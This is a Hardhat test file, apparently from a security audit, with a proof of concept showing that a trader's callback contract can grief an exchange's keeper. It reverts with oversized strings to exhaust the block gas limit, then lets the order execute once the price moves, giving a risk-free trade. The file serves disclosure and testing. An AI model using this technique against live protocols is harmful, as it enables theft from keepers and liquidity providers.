import { expect } from "chai";
import { mine, time } from "@nomicfoundation/hardhat-network-helpers";
import { deployFixture } from "../../../utils/fixture";
import { expandDecimals, decimalToFloat } from "../../../utils/math";
import { getBalanceOf, getSyntheticTokenAddress, getSupplyOf } from "../../../utils/token";
import { getDepositCount, getDepositKeys, createDeposit, executeDeposit, handleDeposit } from "../../../utils/deposit";
import * as keys from "../../../utils/keys";
import { getAccountPositionCount, getPositionCount, getPositionKeys } from "../../../utils/position";
import {
  OrderType,
  getOrderCount,
  handleOrder,
  createOrder,
  executeOrder,
  getOrderKeys,
  DecreasePositionSwapType,
} from "../../../utils/order";
import { expectTokenBalanceIncrease } from "../../../utils/token";
import { grantRole } from "../../../utils/role";
import { executeLiquidation } from "../../../utils/liquidation";
import { ethers } from "hardhat";
import { TOKEN_ORACLE_TYPES } from "../../../utils/oracle";
import { BigNumber } from "ethers";
import { getIsAdlEnabled, updateAdlState, executeAdl } from "../../../utils/adl";
import { getPoolAmount, getMarketTokenPrice } from "../../../utils/market";
import { claimableCollateralAmountKey } from "../../../utils/keys";
import { createWithdrawal, executeWithdrawal, handleWithdrawal } from "../../../utils/withdrawal";
import { hashData, hashString, encodeData } from "../../../utils/hash";

describe("Guardian.CBU-1", () => {
  const { provider } = ethers;

  let fixture;
  let user0, user1, user2, wallet;
  let reader,
    dataStore,
    oracle,
    depositVault,
    ethUsdMarket,
    ethUsdSpotOnlyMarket,
    wnt,
    usdc,
    exchangeRouter,
    orderHandler,
    referralStorage,
    orderVault,
    positionUtils,
    solAddr,
    positionStoreUtils,
    gasGriefingRevertContract,
    tokenUtils,
    wntAccurate,
    ethUsdAccurateMarket,
    marketUtils,
    solUsdMarket,
    config;
  let roleStore, decreasePositionUtils, executionFee, prices;
  let eventEmitter, adlUtils;

  beforeEach(async () => {
    fixture = await deployFixture();

    ({ wallet, user0, user1, user2 } = fixture.accounts);
    ({ executionFee, prices } = fixture.props);
    ({
      reader,
      dataStore,
      orderHandler,
      oracle,
      depositVault,
      ethUsdMarket,
      orderVault,
      ethUsdSpotOnlyMarket,
      gasGriefingRevertContract,
      tokenUtils,
      wnt,
      marketUtils,
      referralStorage,
      positionUtils,
      usdc,
      exchangeRouter,
      positionStoreUtils,
      roleStore,
      decreasePositionUtils,
      eventEmitter,
      wntAccurate,
      ethUsdAccurateMarket,
      solUsdMarket,
      config,
      adlUtils,
    } = fixture.contracts);

    await grantRole(roleStore, wallet.address, "LIQUIDATION_KEEPER");
    solAddr = getSyntheticTokenAddress("SOL");

    await handleDeposit(fixture, {
      create: {
        market: ethUsdMarket,
        longTokenAmount: expandDecimals(1000, 18),
        shortTokenAmount: expandDecimals(500 * 1000, 6),
      },
    });
  });

  it("CRITICAL: Callbacks can grief the keeper for a risk-free trade", async () => {
    // Set the block gas limit to 8,000,000 to simulate Avalanche C-chain block gas limits
    await network.provider.send("evm_setBlockGasLimit", ["0x7A1200"]);

    const initialUSDCAmount = expandDecimals(50_000, 6);

    const increaseParams = {
      account: user1,
      market: ethUsdMarket,
      callbackGasLimit: 2_000_000,
      callbackContract: gasGriefingRevertContract,
      minOutputAmount: 0,
      initialCollateralToken: usdc,
      initialCollateralDeltaAmount: initialUSDCAmount,
      swapPath: [],
      sizeDeltaUsd: decimalToFloat(200 * 1000),
      acceptablePrice: expandDecimals(5001, 12),
      orderType: OrderType.MarketIncrease,
      isLong: true,
      shouldUnwrapNativeToken: false,
      gasLimit: 8_000_000, // For replicating Avalanche C-chain
    };

    await createOrder(fixture, increaseParams);

    // Normally, without a callback, this MarketIncrease would consume around 2,000,000 gas and exeecute just fine.
    // However, the attacker is able to cause the keeper to expend ~5,000,000+ extra gas by reverting with an
    // extremely large revert string on top of the additional ~2,000,000 gas spent during the callback.

    // The following execution requires 9,500,000+ gas which will overflow the 8,000,000 block gas limit and revert with OOG
    await expect(executeOrder(fixture, {
      tokens: [wnt.address],
      minPrices: [expandDecimals(5000, 4)],
      maxPrices: [expandDecimals(5000, 4)],
      precisions: [8],
      priceFeedTokens: [usdc.address],
      gasLimit: 8_000_000, // For replicating Avalanche C-chain
    })).to.be.reverted;

    // Now the attacker sees ETH move to $6,000 and allows the tx to execute for a risk-free trade
    await gasGriefingRevertContract.flipSwitch({ gasLimit: increaseParams.gasLimit });

    await executeOrder(fixture, {
      tokens: [wnt.address],
      minPrices: [expandDecimals(5000, 4)],
      maxPrices: [expandDecimals(5000, 4)],
      precisions: [8],
      priceFeedTokens: [usdc.address],
      gasLimit: 8_000_000, // For replicating Avalanche C-chain
    });

    // Even on Arbitrum, an attacker can view the gasLimit that was provided by the keeper and front-run the execution
    // to toggle the large revert string on. This will cause the keeper to expend a tremendously larger amount of gas
    // and potentially cause the execution to fail.

    // A malicious trader can leverage this to execute a risk-free trade on the exchange or simply grief the keeper
    // to siphon it's gas.

    // Reset the block gas limit to 30,000,000
    await network.provider.send("evm_setBlockGasLimit", ["0x1C9C380"]);
  });
});
